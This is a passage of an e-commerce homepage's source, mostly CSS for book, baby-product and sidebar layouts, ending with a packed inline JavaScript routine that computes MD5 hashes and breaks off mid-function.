.book_new .book_tab_img li a,.book_new .book_tab_img li a:hover{color:#323232;font:12px/28px "Microsoft YaHei";}
.book_new .book_tab_img li a:hover{color:#ff2832;}
.book_new .roll_aa{width:335px;height:220px;border-right:1px solid #e6e6e6;border-bottom:1px solid #e6e6e6;top:0;left:240px;overflow:hidden;position:absolute;}
.book_new .roll_aa .btn_brand_prev,.book_new .roll_aa .btn_brand_next{display:block;position:absolute;width:30px;height:43px;top:7px;background-image:url(http://img60.ddimg.cn/upload_img/00111/home/home_sprite_1507.png);background-repeat:no-repeat;background-color:#000;z-index:20;cursor:pointer;opacity:0.2;filter:alpha(opacity=20);}
.book_new .roll_aa .btn_brand_prev{left:0;background-position:0px -83px;}
.book_new .roll_aa .btn_brand_next{right:0;background-position:-36px -83px;}
.book_new .roll_aa .btn_prev_hover,.home_screen .roll_aa .btn_next_hover{opacity:0.5;filter:alpha(opacity=50);}
.book_new .roll_aa .btn_brand_prev,.book_new .roll_aa .btn_brand_next{top:75px;}
.book_new .mix_marquee_tab{position:absolute;bottom:6px;left:50%;z-index:666;}
.book_new .mix_marquee_tab li{float:left;width:10px;height:3px;margin-right:4px;_display:inline;font-size:0;line-height:9px;overflow:hidden;background:#fff;}
.book_new .mix_marquee_tab li.current{background:#5e5e5e;}
.book_new .book_upper2{position:absolute;top:0;right:0;width:334px;height:220px;overflow:hidden;border-bottom:1px solid #e6e6e6;}
.book_new .book_lower4{position:absolute;top:221px;right:0;width:668px;height:220px;overflow:hidden;}
.book_new .book_upper2 .list_aa{float:left;width:166px;height:220px;border-right:1px solid #e6e6e6;position:relative;}
.book_new .book_lower4 .list_aa{float:left;width:166px;height:220px;border-right:1px solid #e6e6e6;position:relative;}
.book_new .book_upper2 li .img,.book_new .book_lower4 li .img{display:block;width:150px;height:150px;overflow:hidden;text-align:center;margin:7px auto 0;}
.book_new .book_upper2 li .name,.book_new .book_lower4 li .name{height:16px;line-height:16px;width:150px;margin:5px auto 0;overflow:hidden;}
.book_new .name a,.book_new .name a:hover{color:#646464;}
.book_new .name a:hover{color:#ff2832;}
.book_new .book_upper2 li .price,.book_new .book_lower4 li .price{width:150px;margin:3px auto 0;}
.book_new .book_upper2 li .rob,.book_new .book_lower4 li .rob{color:#ff2832;font:14px Arial;display:inline-block;margin-right:10px;}
.book_new .book_upper2 li .price_r,.book_new .book_lower4 li .price_r{font:12px Arial;color:#969696;text-decoration:line-through;}
.book_new .book_upper2 li .ebookprice_n,.book_new .book_lower4 li .ebookprice_n {display: block;  font: 12px Arial;  padding: 4px 0 0 16px;  color: #787878; background: url(http://img63.ddimg.cn/upload_img/00111/book/e-book.png) no-repeat 0 5px;}
.book_new .roll_aa .over{width:335px;height:220px;}
.book_new .roll_aa .over ul{width:10000px;position:relative;}
.book_new .roll_aa .over li,.book_new .roll_aa .over li a{padding:0;width:335px;height:220px;display:block;overflow:hidden;text-align:center;}
.book_new .roll_aa .over li{float:left;}
.book_new .tab_content_aa .tab_4{width:909px;height:441px;border-right:1px solid #e6e6e6; overflow:hidden;position:relative;}
.book_new .book_tab_6img{position:absolute;top:0;left:240px;width:672px;height:442px;}
.book_new .book_tab_6img a,.book_new .book_tab_6img a:hover{float:left;width:223px;height:220px;overflow:hidden;border-right:1px solid #e6e6e6;border-bottom:1px solid #e6e6e6;}
.book_new .floor_tab_bang{width:278px;height:497px;position:absolute;right:0;top:0;border:1px solid #e6e6e6;overflow:hidden;}
.book_new .floor_tab_bang .headfloor_tab_bang{height:46px;width:280px;}
.book_new .floor_tab_bang .headfloor_tab_bang li{float:left;height:46px;width:139px;border-right:1px solid #e6e6e6;text-align:center;color:#464646;font:16px/46px "Microsoft YaHei",Simsun;background-color:#f5f5f5;cursor:default;border-bottom:1px solid #e6e6e6;}
.book_new .floor_tab_bang .headfloor_tab_bang li.on{background-color:#fff;border-bottom:1px solid #fff;}
.book_new .book_top{padding-top:10px;}
.book_new .book_top ul{height:429px;width:278px;overflow:hidden;}
.book_new .book_top li{border-bottom:1px solid #e5e5e5;width:278px;clear:both;vertical-align:top;}
.book_new .book_top li.bar{height:32px;line-height:32px;}
.book_new .book_top li.item{height:132px;}
.book_new .book_top li .num{float:left;width:25px;height:33px;font:12px/33px Arial;padding-left:15px;background:#fff;margin-bottom:-1px;overflow:hidden;}
.book_new .book_top li.item .num{height:133px;}
.book_new .book_top li .img{width:90px;height:90px;overflow:hidden;float:left;margin:15px 0 0;}
.book_new .book_top li .img img{width:90px;height:90px;}
.book_new .book_top li .name{float:left;width:140px;height:32px;line-height:32px;overflow:hidden;}
.book_new .book_top li.item .name{height:100px;margin:15px 0 0 5px;_display:inline;}
.book_new .book_top li.item .name a{line-height:20px;}
.book_new .book_top li.item .name a span{display:block;color:#969696;}
.book_new .book_top li.item .name a:hover span{color:#ff2832;}
.book_new .book_top li.line1 .num{color:#ff3228;font-weight:bold;}
.book_new .book_top li.line2 .num,.book_new .book_top li.line3 .num{color:#ff3228;}
.book_new .book_upper2 .pic,.book_new .book_lower4 .pic{float:left;width:166px;height:220px;overflow:hidden; border-right:1px solid #e6e6e6;}
.book_new .book_upper2 .pic img,.book_new .book_lower4 .pic img{width:166px;height:220px;}.floor_tall{height:655px;overflow:hidden;}
.floor_tall .home_screen{height:635px;}
.floor_tall .home_screen_left .pic{height:521px;}
.floor_tall .home_screen_left{height:579px;}
.floor_tall .tab_content_aafloor_tab .roll_aa{height:340px;}
.floor_tall .tab_content_aafloor_tab .roll_aa .over ul li a,.floor_tall .pic_uppper3{height:340px;}
.floor_tall .pic_lower5{top:398px;}
.floor_tall .pic_uppper3 li a{height:340px;}
.floor_tall .tab_content_aafloor_tab .roll_aa .btn_brand_prev,.floor_tall .tab_content_aafloor_tab .roll_aa .btn_brand_next{top:138px;}
.floor_tall .roll_aa{top:577px;}
.floor_tall .home_screen .pic_uppper3 a{width:191px;height:340px;border-right:1px solid #e6e6e6;float:left;overflow:hidden;}
.floor_tall .home_screen .pic_lower5{width:960px;position:absolute;left:240px;top:398px;border-bottom:1px solid #e6e6e6;height:180px;overflow:hidden;}
.floor_tall .home_screen .pic_lower5 a{float:left;width:191px;border-right:1px solid #e6e6e6;height:180px;overflow:hidden;text-align:center;}.preg_baby_floor{height:500px;width:1200px;margin:0 auto 30px;}
.preg_baby_floor .preg_baby_top{height:44px;width:1200px;font:bold 20px/44px "Microsoft YaHei";color:#ff2832; overflow:hidden; position:relative;}
.preg_baby_top .preg_baby_top_title,.preg_baby_top .preg_baby_top_title:hover{float:left;margin:9px 0 7px;padding:0 20px 0 0;font:bold 20px/24px "Microsoft YaHei";border-right:1px solid #b7b7b7; text-decoration:none; background:#fff;color:#323232;}
.preg_baby_top .preg_baby_top_title:hover{color:#ff2832;}
.preg_baby_floor .preg_baby_top .list_aa{float:left;height:40px; overflow:hidden;}
.preg_baby_floor .preg_baby_top .list_aa li{ float:left; padding:0 30px; margin:13px 0 0 -13px; background:url(http://img63.ddimg.cn/upload_img/00111/home/title_bg.png) no-repeat left 3px;font:16px/20px "Microsoft YaHei";}
.preg_baby_floor .preg_baby_top .list_aa li a,.preg_baby_floor .preg_baby_top .list_aa li a:hover{font:bold 16px/20px "Microsoft YaHei"; text-decoration:none;color:#323232;}
.preg_baby_floor .preg_baby_top .list_aa li a span.hot{font:14px/20px "Microsoft YaHei"; padding-left:5px;color:#323232;}
.preg_baby_floor .preg_baby_top .title:hover,.preg_baby_floor .preg_baby_top .list_aa li a:hover,.preg_baby_floor .preg_baby_top .list_aa li a:hover span.hot{color:#ff2832!important;}
.preg_baby_floor .preg_baby_mid{border:1px solid #e6e6e6;border-width:1px 0 0 1px;position:relative;height:390px;width:1199px; overflow:hidden;}
.preg_baby_mid_l,.preg_baby_mid_m,.preg_baby_mid_r{position:absolute;top:0;overflow:hidden;}
.preg_baby_mid_l{left:0;width:221px;}
.preg_baby_mid_m{left:221px;}
.preg_baby_mid_m .over{width:314px;height:389px;border:1px solid #e6e6e6;border-width:0 1px 1px 0;overflow:hidden;}
.preg_baby_mid_m .over ul{width:10000px;position:relative}
.preg_baby_mid_m .over ul li,.preg_baby_mid_m .over ul li img{display:block;width:314px;height:389px;}
.preg_baby_mid_m .over ul li{float:left;}
.preg_baby_mid_m .mix_marquee_tab{ position:absolute;bottom:20px;z-index:6666;}
.preg_baby_floor .btn_brand_prev,.preg_baby_floor .btn_brand_next{display:block;position:absolute;width:30px;height:43px;top:174px;background-image:url(http://img60.ddimg.cn/upload_img/00111/home/home_sprite_1507.png);background-repeat:no-repeat;background-color:#000;z-index:20;cursor:pointer;opacity:0.2;filter:alpha(opacity=20);}
.preg_baby_floor .btn_brand_prev{left:0;background-position:0px -83px;}
.preg_baby_floor .btn_brand_next{right:0;background-position:-36px -83px;}
.preg_baby_floor .btn_prev_hover,.preg_baby_floor .btn_next_hover{opacity:0.5;filter:alpha(opacity=50);}
.preg_baby_mid_m .mix_marquee_tab{ position:absolute;bottom:20px;left:50%;}
.preg_baby_mid_m .mix_marquee_tab li{ float:left;width:12px;height:12px; overflow:hidden; background-color:#c8c8c8; border-radius:10px; margin-right:8px; line-height:36px; font-size:0;}
.preg_baby_mid_m .mix_marquee_tab li.current{ background-color:#ff2832;}
.preg_baby_mid_r{left:536px;width:663px;}
.preg_baby_mid_l .pic,.preg_baby_mid_r .pic{float:left;width:220px;height:194px;border:1px solid #e6e6e6;border-width:0 1px 1px 0;}
.preg_baby_mid_l img,.preg_baby_mid_r img{width:200px;height:174px; margin:10px 0 0 10px;}
.preg_baby_floor .preg_baby_bottom{height:1198px;height:64px;border:1px solid #e6e6e6;border-top:0;overflow:hidden;background-color:#f7f7f7;position:relative;}
.preg_baby_bottom .over{width:1179px;overflow:hidden;margin:10px auto 0;}
.preg_baby_bottom ul{width:10000px;}
.preg_baby_bottom li{float:left;width:118px;height:44px;margin-left:-1px;border-left:1px dashed #dfdfdf;}
.preg_baby_bottom li a,.preg_baby_bottom li a:hover{display:block;width:109px;height:44px;margin-left:4px;overflow:hidden;}
.preg_baby_floor .preg_baby_bottom .btn_brand_prev,.preg_baby_floor .preg_baby_bottom .btn_brand_next{top:10px;}/**fix_box**/
.fix_box{left:50%;margin-left:-638px;position:fixed;bottom:30px;_position:absolute;_top:expression(eval(documentElement.scrollTop+document.documentElement.offsetHeight-this.offsetHeight-30));z-index:10000;font-family:"Microsoft Yahei";}
.fix_box .fix_screen_list{width:38px;list-style:none;position:relative;z-index:10;overflow:hidden;margin:0;padding:0;}
    .on .fix_screen_list {width:auto;_width:200px;}
.fix_box .fix_screen_list li{height:40px;line-height:40px;position:relative;z-index:5;background-color:#f6f6f6;width:38px;overflow:hidden;}
.fix_box .fix_screen_list li.on{width:auto;z-index:10;overflow:visible;}
.fix_box .fix_screen_list li a{display:block;font-size:14px;color:#fff;text-decoration:none;padding-left:38px;height:40px;background:url(http://img61.ddimg.cn/upload_img/00111/home/fix_box_icon_161205.png) 0 0 no-repeat;}
.fix_box .fix_screen_list li a span {padding:0 15px 0 2px;}
.fix_box .fix_screen_list li .f2 {background-position:0 -40px;}
.fix_box .fix_screen_list li .f3 {background-position:0 -80px;}
.fix_box .fix_screen_list li .f4 {background-position:0 -120px;}
.fix_box .fix_screen_list li .f6 {background-position:0 -160px;}
.fix_box .fix_screen_list li .f5 {background-position:0 -200px;}
.fix_box .fix_screen_list li .f7 {background-position:0 -240px;}
.fix_box .fix_screen_list li .f8 {background-position:0 -280px;}
.fix_box .fix_screen_list li .f10 {background-position:0 -320px;}
.fix_box .fix_screen_list li .f9 {background-position:0 -360px;}
.fix_box .fix_screen_list li .f11 {background-position:0 -400px;}
.fix_box .fix_screen_list li .f12 {background-position:0 -440px;}
.fix_box .fix_screen_list li .f13 {background-position:0 -480px;}
.fix_box .fix_screen_list li .f14 {background-position:0 -520px;}
.fix_box .fix_screen_list li .f15 {background-position:0 -560px;}
.fix_box .fix_screen_list li.on .f1, .fix_box .fix_screen_list li.current .f1 {background-position:-40px 0;background-color:#93d46f;}
.fix_box .fix_screen_list li.on .f2, .fix_box .fix_screen_list li.current .f2 {background-position:-40px -40px;background-color:#f59f70;}
.fix_box .fix_screen_list li.on .f3, .fix_box .fix_screen_list li.current .f3 {background-position:-40px -80px;background-color:#8eaff2;}
.fix_box .fix_screen_list li.on .f4, .fix_box .fix_screen_list li.current .f4 {background-position:-40px -120px;background-color:#fca230;}
.fix_box .fix_screen_list li.on .f6, .fix_box .fix_screen_list li.current .f6 {background-position:-40px -160px;background-color:#ba99ed;}
.fix_box .fix_screen_list li.on .f5, .fix_box .fix_screen_list li.current .f5 {background-position:-40px -200px;background-color:#fb98a9;}
.fix_box .fix_screen_list li.on .f7, .fix_box .fix_screen_list li.current .f7 {background-position:-40px -240px;background-color:#ff857f;}
.fix_box .fix_screen_list li.on .f8, .fix_box .fix_screen_list li.current .f8 {background-position:-40px -280px;background-color:#ee9fcf;}
.fix_box .fix_screen_list li.on .f10, .fix_box .fix_screen_list li.current .f10 {background-position:-40px -320px;background-color:#f5b600;}
.fix_box .fix_screen_list li.on .f9, .fix_box .fix_screen_list li.current .f9 {background-position:-40px -360px;background-color:#64ace3;}
.fix_box .fix_screen_list li.on .f11, .fix_box .fix_screen_list li.current .f11 {background-position:-40px -400px;background-color:#b6c619;}
.fix_box .fix_screen_list li.on .f12, .fix_box .fix_screen_list li.current .f12 {background-position:-40px -440px;background-color:#67d8d1;}
.fix_box .fix_screen_list li.on .f13, .fix_box .fix_screen_list li.current .f13 {background-position:-40px -480px;background-color:#f97f67;}
.fix_box .fix_screen_list li.on .f14, .fix_box .fix_screen_list li.current .f14 {background-position:-40px -520px;background-color:#72d599;}
.fix_box .fix_screen_list li.on .f15, .fix_box .fix_screen_list li.current .f15 {background-position:-40px -560px;background-color:#f97f67;}
.fix_box .fix_screen_list li a:hover{text-decoration:none;}/**侧边栏**/
.sidebar_wrap {position:fixed;top:0;right:0;z-index:100000;height:100%;_position:absolute;_bottom:auto;_top:expression(eval(document.documentElement.scrollTop));}
.sidebar{position:absolute;_position:relative;right:0;top:0;width:34px;padding:0;margin:0;height:100%;zoom:1;background:url(http://img63.ddimg.cn/upload_img/00446/111/bg_sidebar.png) repeat-y 0 0;}
.sidebar .sale {position:absolute;top:0;left:0;width:34px;height:135px;}
.sidebar .sale .sale_big {position: absolute;width:100px;height:128px;left:-109px;top:0;z-index: 3;padding:4px;border:1px solid #cfcfcf;background:#fff; display:none;}
.sidebar_top{margin:135px auto 0;position:relative;}
.sidebar_top a,.sidebar_top a:hover,.sidebar_b a,.sidebar_b a:hover{background-image:url(http://img61.ddimg.cn/upload_img/00111/home/sidebar_icon_411.png);background-repeat:no-repeat;position:relative;font:12px/34px "Arial";color:#fff;text-decoration:none;display:block;width:34px;height:34px;}
.sidebar_top a span,.sidebar_b a span{display:none;color:#fff;position:relative;top:0;left:0;background:#4f4f4f;text-align:center;width:79px;}
/*.sidebar_top a.on,.sidebar_b a.on{width:79px;}*/
.sidebar_top a.on span,.sidebar_b a.on span{display:block;}
.sidebar_top a.cart{background-position:0 0;}
.sidebar_top a.cart:hover{background-position:-40px 0;}
.sidebar_top a.cart em{width:22px;height:14px;border-radius:5px;background-color:#ff3228;line-height:14px;display:block;color:#fff;position:absolute;top:0px;right:0;white-space:nowrap; z-index:2;}
.sidebar_top a.collect{background-position:0 -35px;}
.sidebar_top a.collect:hover{background-position:-40px -35px;}
.sidebar_top a.footprint{background-position:0 -70px;}
.sidebar_top a.footprint:hover{background-position:-40px -70px;}
.sidebar_top a.sidebar_points{background-position:0 -105px;}
.sidebar_top a.sidebar_points:hover{background-position:-40px -105px;}
.sidebar_b{position:absolute;bottom:4px;text-align:center;width:34px;}
.sidebar_b .code2s{background-position:0 -140px;}
.sidebar_b .code2s:hover{background-position:-40px -140px;}
.sidebar_b .code2b{position: absolute;width:98px;height:125px;left:-110px;bottom:0;z-index: 3;padding:8px 5px;border:1px solid #cfcfcf;background:#fff;}
.sidebar_b .code2b img{display:block;width:98px;height:120px;}
.sidebar_b .back_top{background-position:0 -175px;}
.sidebar_b .back_top:hover{background-position:-40px -175px;}
.sidebar_b .survey{height:40px;background-position:0 -210px;}
.sidebar_b .survey:hover{height:40px;background-position:-40px -210px;}
.sidebar_wrap_open .sidebar{right:220px;}
.sidebar_wrap .sidebar_open{display:none;}
.sidebar_wrap_open .sidebar_open{display:block;width:220px;position:absolute;right:0;top:0;height:100%;background:#2f2f2f;}
.sidebar_open h4{height:34px;font:14px/34px "Microsoft Yahei";color:#fff;text-align:center;padding:0;margin:0;position:relative;}
.sidebar_open h4 .close{background:url(http://img60.ddimg.cn/upload_img/00111/home/sidebar_icon_411.png) no-repeat 0 -253px;position:absolute;left:0;top:0;width:40px;height:34px;font-size:0;overflow:hidden;line-height:120px;}
.sidebar_open .sidebar_list{width:200px;overflow:hidden;padding:0;margin:0 auto;}
.sidebar_open .sidebar_list li{float:left;height:117px;padding:12px 5px 0;width:90px;overflow:hidden;}
.sidebar_open .sidebar_list li a{display:block;}
.sidebar_open .sidebar_list li img{width:90px;height:90px;display:block;}
.sidebar_open .sidebar_list li .price{font:12px/24px Arial;color:#fff;display:block;text-align:center;padding-top:4px;}
.sidebar_open .sidebar_btn{width:190px;margin:6px auto 0;}
.sidebar_open .sidebar_btn a,.sidebar_open .sidebar_btn a:hover{display:block;width:160px;padding-right:30px;height:28px;font:12px/28px "Microsoft Yahei";background:#595959 url(http://img60.ddimg.cn/upload_img/00111/home/sidebar_icon_411.png) no-repeat 113px -290px;color:#fff;text-decoration:none;text-align:center;}
.sidebar_open .sidebar_none{width:150px;margin:30px auto 0;}
.sidebar_open .sidebar_none .icon{width:132px;height:126px;display:block;background-image:url(http://img63.ddimg.cn/upload_img/00111/home/sidebar_open.png);background-repeat:no-repeat;margin:0 auto 10px;}
.sidebar_open .sidebar_none .icon_sc{background-position:0 0;}
.sidebar_open .sidebar_none .icon_zj{background-position:0 -150px;}
.sidebar_open .sidebar_none span{display:block;color:#848484;font:12px/24px "Microsoft Yahei";text-align:center;margin-right:-12px;}
.sidebar_loading{font:12px/20px "Microsoft Yahei"; text-align:center;color:#fff;padding-top:50px;}
.sidebar_loading p{padding:0; margin:0;}
.sidebar_loading img{width:40px;height:40px;display:block; margin:10px auto 0;}
.sidebar_b .guanggao{font:12px/30px "Arial";display:block;width:34px;overflow:hidden;text-align:center;color:#fff;background:#474747;margin-top:1px;cursor:default;}

.sidebar_top a.robot{background-position:0 -320px;}
.sidebar_top a.robot:hover{background-position:-40px -320px;}
.sidebar_robot{border:none;width:220px;overflow:hidden; margin:0; height:100%;}.mix_search_top{width:100%;height:52px;position:fixed;top:0;background-color:rgba(229,27,41,0.9); z-index:99999;left:0;display:none;}
@media \0screen\,screen\9 {
.mix_search_top{background-color:#e51b29;filter:Alpha(opacity=90);*zoom:1;}}
.mix_search{width:1200px; margin:0 auto;overflow:hidden;height:52px;}
.mix_search .logo{ padding:6px 0 0;width:210px; float:left;overflow:hidden;height:46px;}
.mix_search .search{float:left;width:738px;height:32px; overflow:hidden; background:#fff; font:14px/32px "Microsoft YaHei"; margin-top:9px;padding-left:10px; position:relative;}
.mix_search .search input{height:32px; background:#fff; line-height:32px; border:0;width:700px;color:#666;}
.mix_search .search a,.mix_search .search a:hover{position:absolute;right:0;top:0;width:32px;height:32px; line-height:100px; overflow:hidden; font-size:0; background:url(http://img62.ddimg.cn/upload_img/00111/home/home_sprite_1511.png) no-repeat 0 -250px; text-decoration:none;}
.mix_search .list{padding:9px 0 0 33px;float:left;width:205px;}
.mix_search .list li{height:32px;color:#fff;font:14px/32px "Microsoft YaHei"; overflow:hidden;width:210px;clear:both;}
.mix_search .list li a,.mix_search .list li a:hover{color:#fff;font:14px/32px "Microsoft YaHei";white-space:nowrap;}
.mix_search_top input{outline:none;}
.mix_search_top .con{clear:none;}.cywj_img5{width:1200px;margin:0 auto 30px;height:182px;overflow:hidden;}
.cywj_img5 .title{height:40px;text-decoration:none;color:#323232;}
.cywj_img5 .title a,.cywj_img5 .title a:hover{font:bold 20px/40px "Microsoft YaHei";text-decoration:none;color:#323232;}
.cywj_img5 .title a:hover{color:#ff2832;}
.cywj_img5 .img5{height:142px;width:1210px;overflow:hidden;}
.cywj_img5 .img5 a{float:left;width:230px;height:140px;border:1px solid #e6e6e6;margin-right:10px;_display:inline;overflow:hidden;}
.cywj_img5 .img5 img{width:230px;height:140px;}.motherbaby_toy{width:1200px; margin:0 auto 20px;height:448px;}
.motherbaby_toy .top{height:40px;font:bold 20px/24px "Microsoft YaHei";color:#323232;}
.motherbaby_toy .top .home_screen_head{float:left;margin:9px 0 7px;padding:0 20px 0 6px;font:bold 20px/24px "Microsoft YaHei"; border-right:1px solid #b7b7b7; background:#fff;color:#323232;}
.motherbaby_toy .top .home_screen_head span{font-size:16px; position:relative;top:-3px;}
.motherbaby_toy .top .home_screen_head a,.motherbaby_toy .top .home_screen_head a:hover{color:#323232;text-decoration:none;}
.motherbaby_toy .top .home_screen_head a:hover{color:#ff2832;}
.motherbaby_toy .list_aa{float:left;height:40px; overflow:hidden;}
.motherbaby_toy .list_aa li{ float:left; padding:0 30px; margin:13px 0 0 -13px; background:url(http://img63.ddimg.cn/upload_img/00111/home/title_bg.png) no-repeat left 3px;font:16px/20px "Microsoft YaHei";}
.motherbaby_toy .list_aa li a,.motherbaby_toy .list_aa li a:hover{font:bold 16px/20px "Microsoft YaHei"; text-decoration:none;color:#323232;}
.motherbaby_toy .list_aa li a span.hot{font:14px/20px "Microsoft YaHei"; padding-left:5px;color:#323232;}
.motherbaby_toy .top .title:hover,.motherbaby_toy .list_aa li a:hover,.motherbaby_toy .list_aa li a:hover span.hot{color:#ff2832!important;}
.motherbaby_toy .middle{border:1px solid #e6e6e6;border-width:1px 0 0 1px; position:relative;width:1199px;height:342px;}
.motherbaby_toy .left,.motherbaby_toy .lunbo_mid,.motherbaby_toy .right{position:absolute;top:0;overflow:hidden;}
.motherbaby_toy .left{left:0;width:400px;}
.motherbaby_toy .lunbo_mid{left:400px;}
.motherbaby_toy .right{left:799px;width:400px;}
.motherbaby_toy .left a,.motherbaby_toy .right a{float:left;width:199px;height:170px;overflow:hidden;border:1px solid #e6e6e6;border-width:0 1px 1px 0;}
.motherbaby_toy .left img,.motherbaby_toy .right img{width:199px;height:170px;}
.motherbaby_toy .middle .over{width:398px;height:341px;border:1px solid #e6e6e6;border-width:0 1px 1px 0;overflow:hidden;}
.motherbaby_toy .over ul{width:10000px;position:relative}
.motherbaby_toy .middle .over ul li,.motherbaby_toy .middle .over ul li img{display:block;width:398px;height:341px;}
.motherbaby_toy .middle .over ul li{float:left;}
.motherbaby_toy .mix_marquee_tab{ position:absolute;bottom:20px;z-index:6666;}
.motherbaby_toy .btn_brand_prev,.motherbaby_toy .btn_brand_next{display:block;position:absolute;width:30px;height:43px;top:174px;background-image:url(http://img60.ddimg.cn/upload_img/00111/home/home_sprite_1507.png);background-repeat:no-repeat;background-color:#000;z-index:20;cursor:pointer;opacity:0.2;filter:alpha(opacity=20);}
.motherbaby_toy .btn_brand_prev{left:0;background-position:0px -83px;}
.motherbaby_toy .btn_brand_next{right:0;background-position:-36px -83px;}
.motherbaby_toy .btn_prev_hover,.motherbaby_toy .btn_next_hover{opacity:0.5;filter:alpha(opacity=50);}
.motherbaby_toy .mix_marquee_tab{ position:absolute;bottom:20px;left:50%;}
.motherbaby_toy .mix_marquee_tab li{ float:left;width:12px;height:12px; overflow:hidden; background-color:#c8c8c8; border-radius:10px; margin-right:8px; line-height:36px; font-size:0;}
.motherbaby_toy .mix_marquee_tab li.current{ background-color:#ff2832;}
.motherbaby_toy .bottom{height:1198px;height:64px;border:1px solid #e6e6e6;border-top:0;overflow:hidden;background-color:#f7f7f7;position:relative;}
.motherbaby_toy .bottom .over{width:1179px;overflow:hidden;margin:10px auto 0;}
.motherbaby_toy .bottom li{float:left;width:118px;height:44px;margin-left:-1px;border-left:1px dashed #dfdfdf;}
.motherbaby_toy .bottom li a,.motherbaby_toy .bottom li a:hover{display:block;width:109px;height:44px;margin-left:4px;overflow:hidden;}
.motherbaby_toy .bottom .btn_brand_prev,.motherbaby_toy .bottom .btn_brand_next{top:10px;}/* 猜你喜欢 */
.home_screen_cai{width:1200px;margin:0 auto 30px;}
.home_screen_cai .head{height:34px;color:#ff2832;font:bold 20px "Microsoft YaHei";border-bottom:2px solid #ff3228;padding-left:5px;}
.home_screen_cai .tab_c{border:1px solid #e6e6e6;width:1198px;margin:10px auto 0;overflow:hidden;padding:10px 0 15px;background:url(http://img63.ddimg.cn/upload_img/00111/gg/guanggao02.png) no-repeat right bottom}
.home_screen_cai .tab_c ul{padding-left:5px;width:1188px;}
.home_screen_cai .tab_c ul li{float:left;width:190px;height:258px;padding:4px 3px 7px;border:1px solid #fff;}
.home_screen_cai .tab_c .pic{display:block;width:190px;height:190px;overflow:hidden;margin:0 auto;}
.home_screen_cai .tab_c .pic img{width:190px;height:190px;}
.home_screen_cai .tab_c .name{width:190px;height:32px;line-height:16px;padding:8px 0 0;margin-bottom:5px;overflow:hidden;}
.home_screen_cai .tab_c .name a:hover{color:#ff2832;}
.home_screen_cai .tab_c .price{font:18px Arial;color:#ff2832; position: relative;}
.home_screen_cai .tab_c .price .ebookprice_n {  position: absolute;right:5px; bottom:2px; font: 12px Arial;  padding: 4px 0 0 16px;  color: #787878;  background: url(http://img63.ddimg.cn/upload_img/00111/book/e-book.png) no-repeat 0 5px;}
.home_screen_cai .tab_c ul li.hover{border:1px solid #efefef;box-shadow:0 0 4px #ddd;position:relative;}</style>    </head>
    <body ddt-page="mix_317715">
        <script type="text/javascript">
    eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('r(1c 1H=="O"){o U;(p(){o k={1d:"1I.1J",1e:\'1K\',D:\'O\',1f:\'O\'};k.1g={1h:0,1L:"",F:8,1i:p(a){o b=l.1h?"1M":"1N";o c="";P(o i=0;i<a.B*4;i++){c+=b.1j((a[i>>2]>>((i%4)*8+4))&1k)+b.1j((a[i>>2]>>((i%4)*8))&1k)}u c},1l:p(x,e){x[e>>5]|=1O<<((e)%32);x[(((e+1P)>>>9)<<4)+14]=e;o a=1Q;o b=-1R;o c=-1S;o d=1T;P(o i=0;i<x.B;i+=16){o f=a;o g=b;o h=c;o j=d;a=l.v(a,b,c,d,x[i+0],7,-1U);d=l.v(d,a,b,c,x[i+1],12,-1V);c=l.v(c,d,a,b,x[i+2],17,1W);b=l.v(b,c,d,a,x[i+3],22,-1X);a=l.v(a,b,c,d,x[i+4],7,-1Y);d=l.v(d,a,b,c,x[i+5],12,1Z);c=l.v(c,d,a,b,x[i+6],17,-24);b=l.v(b,c,d,a,x[i+7],22,-25);a=l.v(a,b,c,d,x[i+8],7,26);d=l.v(d,a,b,c,x[i+9],12,-27);c=l.v(c,d,a,b,x[i+10],17,-28);b=l.v(b,c,d,a,x[i+11],22,-29);a=l.v(a,b,c,d,x[i+12],7,2a);d=l.v(d,a,b,c,x[i+13],12,-2b);c=l.v(c,d,a,b,x[i+14],17,-2c);b=l.v(b,c,d,a,x[i+15],22,2d);a=l.w(a,b,c,d,x[i+1],5,-2e);d=l.w(d,a,b,c,x[i+6],9,-2f);c=l.w(c,d,a,b,x[i+11],14,2g);b=l.w(b,c,d,a,x[i+0],20,-2h);a=l.w(a,b,c,d,x[i+5],5,-2i);d=l.w(d,a,b,c,x[i+10],9,2j);c=l.w(c,d,a,b,x[i+15],14,-2k);b=l.w(b,c,d,a,x[i+4],20,-2l);a=l.w(a,b,c,d,x[i+9],5,2m);d=l.w(d,a,b,c,x[i+14],9,-2n);c=l.w(c,d,a,b,x[i+3],14,-2o);b=l.w(b,c,d,a,x[i+8],20,2p);a=l.w(a,b,c,d,x[i+13],5,-2q);d=l.w(d,a,b,c,x[i+2],9,-2r);c=l.w(c,d,a,b,x[i+7],14,2s);b=l.w(b,c,d,a,x[i+12],20,-2t);a=l.z(a,b,c,d,x[i+5],4,-2u);d=l.z(d,a,b,c,x[i+8],11,-2v);c=l.z(c,d,a,b,x[i+11],16,2w);b=l.z(b,c,d,a,x[i+14],23,-2x);a=l.z(a,b,c,d,x[i+1],4,-2y);d=l.z(d,a,b,c,x[i+4],11,2z);c=l.z(c,d,a,b,x[i+7],16,-2A);b=l.z(b,c,d,a,x[i+10],23,-2B);a=l.z(a,b,c,d,x[i+13],4,2C);d=l.z(d,a,b,c,x[i+0],11,-2D);c=l.z(c,d,a,b,x[i+3],16,-2E);b=l.z(b,c,d,a,x[i+6],23,2F);a=l.z(a,b,c,d,x[i+9],4,-2G);d=l.z(d,a,b,c,x[i+12],11,-2H);c=l.z(c,d,a,b,x[i+15],16,2I);b=l.z(b,c,d,a,x[i+2],23,-2J);a=l.A(a,b,c,d,x[i+0],6,-2K);d=l.A(d,a,b,c,x[i+7],10,2L);c=l.A(c,d,a,b,x[i+14],15,-2M);b=l.A(b,c,d,a,x[i+5],21,-2N);a=l.A(a,b,c,d,x[i+12],6,2O);d=l.A(d,a,b,c,x[i+3],10,-2P);c=l.A(c,d,a,b,x[i+10],15,-2Q);b=l.A(b,c,d,a,x[i+1],21,-2R);a=l.A(a,b,c,d,x[i+8],6,2S);d=l.A(d,a,b,c,x[i+15],10,-2T);c=l.A(c,d,a,b,x[i+6],15,-2U);b=l.A(b,c,d,a,x[i+13],21,2V);a=l.A(a,b,c,d,x[i+4],6,-2W);d=l.A(d,a,b,c,